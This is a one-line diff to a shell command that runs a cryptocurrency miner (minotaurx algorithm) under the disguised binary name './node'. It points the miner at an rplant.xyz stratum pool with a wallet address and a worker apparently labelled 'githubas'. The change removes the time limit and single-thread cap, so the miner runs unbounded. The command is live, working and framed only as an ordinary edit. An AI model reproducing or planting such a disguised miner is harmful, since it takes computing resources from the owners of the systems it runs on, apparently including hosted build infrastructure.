@@ -1,1 +1,1 @@
-./node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.githubas --time-limit 600 -t 1
+./node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.githubas 
